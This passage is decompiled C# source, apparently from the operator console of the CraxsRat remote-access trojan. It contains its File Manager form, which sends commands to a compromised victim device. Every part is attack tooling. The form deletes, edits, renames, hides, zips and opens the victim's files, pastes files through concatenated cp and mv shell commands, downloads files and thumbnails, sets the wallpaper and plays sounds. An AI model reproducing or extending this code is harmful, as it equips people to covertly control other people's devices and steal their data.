						SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + text + Data.SPL_DATA + text2,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
					if (Operators.CompareString(left, "back", TextCompare: false) != 0)
					{
						DGV0.Rows.RemoveAt(DGV0.SelectedRows[i].Index);
					}
				}
			}
		}
	}

	private void EditToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
				string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
				if (Operators.CompareString(left, "1", TextCompare: false) == 0)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[2].Tag);
					if (!Operators.ConditionalCompareObjectLessEqual(objectValue, 512000, TextCompare: false))
					{
						Interaction.MsgBox(string.Format(FSize, RuntimeHelpers.GetObjectValue(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[2].Value), RuntimeHelpers.GetObjectValue(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value)), MsgBoxStyle.Critical, reso.nameRAT);
					}
					else if (classClient != null)
					{
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.editor + Data.SPL_SOCKET + "edit" + Data.SPL_DATA + text,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient == null)
		{
			return;
		}
		inp inp2 = new inp();
		inp2.Text = "Zip";
		inp2.LTitle.Text = "File Name";
		inp2.InputText.Text = "new file.zip";
		inp2.StartPosition = FormStartPosition.Manual;
		inp2.Location = Codes.FixSize(this, inp2);
		StringBuilder stringBuilder = new StringBuilder();
		DialogResult dialogResult = inp2.ShowDialog(this);
		checked
		{
			if (dialogResult == DialogResult.OK && classClient != null && DGV0.SelectedRows.Count > 0)
			{
				string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), inp2.InputText.Text));
				int num = DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(left, "1", TextCompare: false) == 0)
					{
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
						stringBuilder.Append(text2 + Data.SPL_LINE);
					}
				}
				if (stringBuilder.ToString().Length > 0)
				{
					object[] parametersObjects = new object[4]
					{
						Client,
						SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "zip" + Data.SPL_DATA + stringBuilder.ToString() + Data.SPL_DATA + text,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
			}
			inp2.Close();
		}
	}

	private void UnZipToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
				if (Operators.CompareString(left, "1", TextCompare: false) == 0)
				{
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
					string text2 = Conversions.ToString(Operators.ConcatenateObject(DGV0.Tag, "/"));
					if (classClient != null)
					{
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "unzip" + Data.SPL_DATA + text + Data.SPL_DATA + text2,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient == null || DGV0.SelectedRows.Count != 1)
		{
			return;
		}
		inp inp2 = new inp();
		inp2.Text = "Rename";
		inp2.LTitle.Text = "new Name";
		inp2.StartPosition = FormStartPosition.Manual;
		inp2.Location = Codes.FixSize(this, inp2);
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				inp2.InputText.Text = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value);
			}
			DialogResult dialogResult = inp2.ShowDialog(this);
			if (dialogResult == DialogResult.OK && classClient != null && DGV0.SelectedRows.Count == 1)
			{
				int num2 = DGV0.SelectedRows.Count - 1;
				for (int j = num2; j >= 0; j += -1)
				{
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[j].Index].Cells[1].Value));
					string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), inp2.InputText.Text));
					if (Operators.CompareString(text, text2, TextCompare: false) != 0)
					{
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "rename" + Data.SPL_DATA + text + Data.SPL_DATA + text2,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						classClient.SendMessage(parametersObjects);
					}
				}
			}
			inp2.Close();
		}
	}

	private void HideToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				if (!Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", TextCompare: false))))
				{
					continue;
				}
				string text = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value);
				if (text.Trim()[0] != '.')
				{
					string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/."), text));
					string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), text));
					if (classClient != null)
					{
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "rename" + Data.SPL_DATA + text3 + Data.SPL_DATA + text2,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			bool flag = default(bool);
			for (int i = num; i >= 0; i += -1)
			{
				if (!Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", TextCompare: false))))
				{
					continue;
				}
				string text = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value);
				if (text.Trim()[0] != '.')
				{
					continue;
				}
				string text2 = null;
				int num2 = text.Length - 1;
				for (int j = 0; j <= num2; j++)
				{
					if (text.Trim()[j] != '.')
					{
						text2 += Conversions.ToString(text.Trim()[j]);
						flag = true;
					}
					else if (flag)
					{
						text2 += Conversions.ToString(text.Trim()[j]);
					}
				}
				flag = false;
				string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), text2));
				string text4 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), text));
				if (classClient != null)
				{
					object[] parametersObjects = new object[4]
					{
						Client,
						SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "rename" + Data.SPL_DATA + text4 + Data.SPL_DATA + text3,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
			}
		}
	}

	private void AddFilesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient == null)
		{
			return;
		}
		inp inp2 = new inp();
		inp2.Text = "Add Files";
		inp2.LTitle.Text = "New name";
		inp2.StartPosition = FormStartPosition.Manual;
		inp2.Location = Codes.FixSize(this, inp2);
		inp2.BOXX.Visible = true;
		DialogResult dialogResult = inp2.ShowDialog(this);
		if (dialogResult == DialogResult.OK && classClient != null)
		{
			bool flag = inp2.CheckFolder.Checked;
			bool flag2 = inp2.CheckHidden.Checked;
			string text = inp2.InputText.Text;
			if (flag2)
			{
				text = "." + text;
			}
			string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), text));
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "create" + Data.SPL_DATA + text2 + Data.SPL_DATA + Conversions.ToString(flag),
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
		inp2.Close();
	}

	private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
				if (Operators.CompareString(left, "1", TextCompare: false) != 0)
				{
					continue;
				}
				string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
				if (classClient != null)
				{
					string text2 = "null";
					if (text.Contains(".") & !text.EndsWith("."))
					{
						text2 = text.Substring(text.LastIndexOf(".") + 1);
					}
					object[] parametersObjects = new object[4]
					{
						Client,
						SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "open" + Data.SPL_DATA + text + Data.SPL_DATA + text2,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
			}
		}
	}

	private bool ISupportedText(string t)
	{
		if (t.Contains("."))
		{
			string value = "\"" + t.Substring(t.LastIndexOf(".")) + "\"";
			if (reso.SupportedText.Contains(value))
			{
				return true;
			}
			return false;
		}
		return false;
	}

	private bool ISupportedImages(string t)
	{
		if (t.Contains("."))
		{
			string value = "\"" + t.Substring(t.LastIndexOf(".")) + "\"";
			if (reso.SupportedImages.Contains(value))
			{
				return true;
			}
			return false;
		}
		return false;
	}

	private bool ISupportedVideo(string t)
	{
		if (t.Contains("."))
		{
			string value = "\"" + t.Substring(t.LastIndexOf(".")) + "\"";
			if (reso.SupportedVideo.Contains(value))
			{
				return true;
			}
			return false;
		}
		return false;
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				if (DGV0.SelectedRows.Count != 1)
				{
					return;
				}
				int num = DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(left, "1", TextCompare: false) == 0)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
						bool flag = false;
						FileDirectory = Conversions.ToString(Operators.ConcatenateObject(classClient.FolderUSER + "\\Thumbs", NewLateBinding.LateGet(DGV0.Tag, null, "Replace", new object[2] { "/", "\\" }, null, null, null)));
						if (text.Substring(text.LastIndexOf("/") + 1).EndsWith(".mp4"))
						{
							string text2 = text.Substring(text.LastIndexOf("/") + 1);
							if (thumb_chk.Checked && Directory.Exists(FileDirectory + "\\" + text2.Replace(".mp4", "")))
							{
								using IEnumerator<string> enumerator = MyProject.Computer.FileSystem.GetFiles(FileDirectory + "\\" + text2.Replace(".mp4", "")).GetEnumerator();
								if (enumerator.MoveNext())
								{
									string current = enumerator.Current;
									FileInfo fileInfo = MyProject.Computer.FileSystem.GetFileInfo(current);
									viwimage.Image = Codes.ReadBitmapFromFile(FileDirectory + "\\" + text2.Replace(".mp4", "") + "\\" + fileInfo.Name);
									viwimage.Visible = true;
									flag = true;
								}
							}
						}
						if (flag)
						{
							break;
						}
						if (thumb_chk.Checked && Directory.Exists(FileDirectory) && File.Exists(FileDirectory + "\\" + text.Substring(text.LastIndexOf("/") + 1)))
						{
							try
							{
								if (viwimage.Image != null)
								{
									viwimage.Image.Dispose();
									viwimage.Image = null;
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							viwimage.Image = Codes.ReadBitmapFromFile(FileDirectory + "\\" + text.Substring(text.LastIndexOf("/") + 1));
							viwimage.Visible = true;
							flag = true;
						}
						if (flag)
						{
							break;
						}
						string text3 = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value);
						object obj = "null";
						obj = (ISupportedImages(text3.ToLower()) ? "false" : ((!ISupportedVideo(text3.ToLower())) ? "null" : "true"));
						if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", TextCompare: false))) && classClient != null)
						{
							string[] array = classClient.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								Client,
								Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "small" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + text + Data.SPL_DATA, obj), Data.SPL_DATA), Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + classClient.UUID),
								Codes.Encoding().GetBytes("null"),
								classClient
							};
							classClient.SendMessage(parametersObjects);
						}
					}
					else
					{
						viwimage.Image = null;
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Sub_Clipboard(string pram)
	{
		if ((Operators.CompareString(pram, "'PASTE'", TextCompare: false) == 0) & (Clipboard.Count > 0))
		{
			string right = Format_Space(Conversions.ToString(DGV0.Tag));
			string text = "";
			foreach (Array item in Clipboard)
			{
				Array instance = item;
				text = ((text.Length == 0) ? Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet(instance, new object[1] { 3 }, null), Strings.Space(1)), NewLateBinding.LateIndexGet(instance, new object[1] { 2 }, null)), Strings.Space(1)), right))) : Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Strings.Space(1) + "&&" + Strings.Space(1), NewLateBinding.LateIndexGet(instance, new object[1] { 3 }, null)), Strings.Space(1)), NewLateBinding.LateIndexGet(instance, new object[1] { 2 }, null)), Strings.Space(1)), right))));
			}
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "commend" + Data.SPL_DATA + text,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
			Clipboard.Clear();
			return;
		}
		Clipboard.Clear();
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
				if (Operators.CompareString(left, "back", TextCompare: false) == 0)
				{
					continue;
				}
				string prm = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
				bool flag = false;
				flag = Operators.CompareString(left, "1", TextCompare: false) == 0;
				if (Operators.CompareString(pram, "'COPY'", TextCompare: false) == 0)
				{
					if (flag)
					{
						Clipboard.Add(new object[4]
						{
							pram,
							flag,
							Format_Space(prm),
							"cp"
						});
					}
					else
					{
						Clipboard.Add(new object[4]
						{
							pram,
							flag,
							Format_Space(prm),
							"cp -R"
						});
					}
				}
				else
				{
					Clipboard.Add(new object[4]
					{
						pram,
						flag,
						Format_Space(prm),
						"mv"
					});
				}
			}
		}
	}

	private string Format_Space(string prm)
	{
		if (prm.Contains(Strings.Space(1)))
		{
			prm = prm.Replace(Strings.Space(1), "(U+0020)".ToLower());
		}
		return prm;
	}

	private void CutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Sub_Clipboard("'CUT'");
	}

	private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Sub_Clipboard("'COPY'");
	}

	private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Clipboard.Count != 0)
		{
			Sub_Clipboard("'PASTE'");
		}
	}

	private void SetWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", TextCompare: false))))
				{
					string right = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value);
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), right));
					if (classClient != null)
					{
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "set_wallpaper" + Data.SPL_DATA + text,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	private void PlaySoundToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", TextCompare: false))))
				{
					string right = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value);
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), right));
					if (classClient != null)
					{
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "play_back" + Data.SPL_DATA + text,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	private void ctxMenu_Opening(object sender, CancelEventArgs e)
	{
		string left = ver;
		if (Operators.CompareString(left, "v1.0", TextCompare: false) != 0)
		{
			SetWallpaperToolStripMenuItem.Visible = true;
		}
		else
		{
			SetWallpaperToolStripMenuItem.Visible = false;
		}
	}

	private void FileManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (DGVDATA.Rows.Count > 0)
		{
			int num = 0;
			foreach (DataGridViewRow item in (IEnumerable)DGVDATA.Rows)
			{
				if (item.Tag.ToString().Length > 1 && Operators.CompareString(item.Tag.ToString(), "x", TextCompare: false) != 0)
				{
					num = 1;
					break;
				}
			}
			if (num > 0)
			{
				try
				{
					if (!Codes.MyMsgBox("Downloads", "Some Downloads is Running :\r\nStop Active Downloads...?", useno: true, Resources.warning48px))
					{
						e.Cancel = true;
						return;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		Timer1.Stop();
		Timer2.Stop();
		Correntindex = 1;
		checked
		{
			int num2 = DownStreams.Count - 1;
			for (int i = 0; i <= num2; i++)
			{
				try
				{
					if (DownStreams[i] != null)
					{
						object objectValue = RuntimeHelpers.GetObjectValue(DownStreams[i]);
						FileStream fileStream = (FileStream)NewLateBinding.LateIndexGet(objectValue, new object[1] { 0 }, null);
						if (fileStream != null)
						{
							fileStream.Dispose();
							fileStream.Close();
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void Pathtxt_SizeChanged(object sender, EventArgs e)
	{
		try
		{
			PB.Size = pathtxt.Size;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void LoadVideo()
	{
		if (DGV0.SelectedRows.Count != 1)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
				if (Operators.CompareString(left, "1", TextCompare: false) == 0)
				{
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
					FileDirectory = Conversions.ToString(Operators.ConcatenateObject(classClient.FolderUSER + "\\Thumbs", NewLateBinding.LateGet(DGV0.Tag, null, "Replace", new object[2] { "/", "\\" }, null, null, null)));
					if (text.Substring(text.LastIndexOf("/") + 1).EndsWith(".mp4"))
					{
						ShowVideo = true;
						thumb_chk.Checked = false;
						thumb_chk.Refresh();
						string text2 = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value);
						object obj = "null";
						obj = (ISupportedImages(text2.ToLower()) ? "false" : ((!ISupportedVideo(text2.ToLower())) ? "null" : "true"));
						if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", TextCompare: false))) && classClient != null)
						{
							string[] array = classClient.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								Client,
								Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "small" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + text + Data.SPL_DATA, obj), Data.SPL_DATA), Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + classClient.UUID),
								Codes.Encoding().GetBytes("null"),
								classClient
							};
							classClient.SendMessage(parametersObjects);
						}
					}
				}
				else
				{
					viwimage.Image = null;
				}
			}
		}
	}

	private void Viwimage_MouseUp(object sender, MouseEventArgs e)
	{
	}

	private void Viwimage_MouseLeave(object sender, EventArgs e)
	{
		ShowVideo = false;
		thumb_chk.Checked = true;
		thumb_chk.Refresh();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (classClient.isconnected)
			{
				if (!classClient.isready)
				{
					return;
				}
				Text = string.Format("{0} - ID:{1}", "File Manager", classClient.UUID);
				ClientPic.Image = classClient.Wallpaper;
				usrscreen.Image = reso.GetScreen(classClient.Screen);
				try
				{
					if (classClient.Row == null)
					{
					}
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return;
				}
			}
			ClientPic.Image = Resources.disconnected;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ClearButton_Click(object sender, EventArgs e)
	{
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		if (DGVDATA.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGVDATA.SelectedRows)
		{
			if (selectedRow.Tag.ToString().Length > 1)
			{
				selectedRow.Tag = "X";
				selectedRow.Cells[4].Value = "Cancelled..";
				selectedRow.DefaultCellStyle.ForeColor = Color.Red;
				selectedRow.Dispose();
			}
		}
	}

	private void Usrbtry_MouseEnter(object sender, EventArgs e)
	{
	}

	private void ClientPic_MouseEnter(object sender, EventArgs e)
	{
	}

	private void MetroSetBadge1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(Downpic.Tag.ToString(), "off", TextCompare: false) == 0)
		{
			Downpic.Tag = "on";
			ClearButton.Enabled = true;
			ClearButton.Visible = true;
			cancelbtn.Enabled = true;
			cancelbtn.Visible = true;
			DGVDATA.BringToFront();
		}
		else
		{
			Downpic.Tag = "off";
			ClearButton.Enabled = false;
			ClearButton.Visible = false;
			cancelbtn.Enabled = false;
			cancelbtn.Visible = false;
			DGVDATA.SendToBack();
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsvsdegvdsergef(object sender, EventArgs e)
	{
		try
		{
			string path = Conversions.ToString(Operators.ConcatenateObject(classClient.FolderUSER + "\\Thumbs", NewLateBinding.LateGet(DGV0.Tag, null, "Replace", new object[2] { "/", "\\" }, null, null, null)));
			int num = 0;
			if (Directory.Exists(path))
			{
				num = Directory.GetFiles(path, "*.*").Count();
			}
			int num2 = checked(DGV0.Rows.Count - 1);
			int count = Clipboard.Count;
			switch (RegistryHandler.Get_Language())
			{
			case "EN":
				CountText.Text = "ALL " + Conversions.ToString(num2);
				Selecttext.Text = "Selected " + Conversions.ToString(DGV0.SelectedRows.Count);
				seentext.Text = "Seen " + num + ((count > 0) ? (Strings.Space(10) + "Clipboard " + Conversions.ToString(Clipboard.Count)) : "");
				break;
			case "CN":
				CountText.Text = "全部的 " + Conversions.ToString(num2);
				Selecttext.Text = "选择 " + Conversions.ToString(DGV0.SelectedRows.Count);
				seentext.Text = "见过 " + num + ((count > 0) ? (Strings.Space(10) + "剪贴板 " + Conversions.ToString(Clipboard.Count)) : "");
				break;
			case "AR":
				CountText.Text = "العدد " + Conversions.ToString(num2);
				Selecttext.Text = "المحدد " + Conversions.ToString(DGV0.SelectedRows.Count);
				seentext.Text = "تمت مشاهدته " + num + ((count > 0) ? (Strings.Space(10) + "في المحفظة " + Conversions.ToString(Clipboard.Count)) : "");
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Viwimage_MouseEnter(object sender, EventArgs e)
	{
		LoadVideo();
	}

	private void Viwimage_MouseLeave_1(object sender, EventArgs e)
	{
		ShowVideo = false;
		thumb_chk.Checked = true;
		thumb_chk.Refresh();
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get0",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get3",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

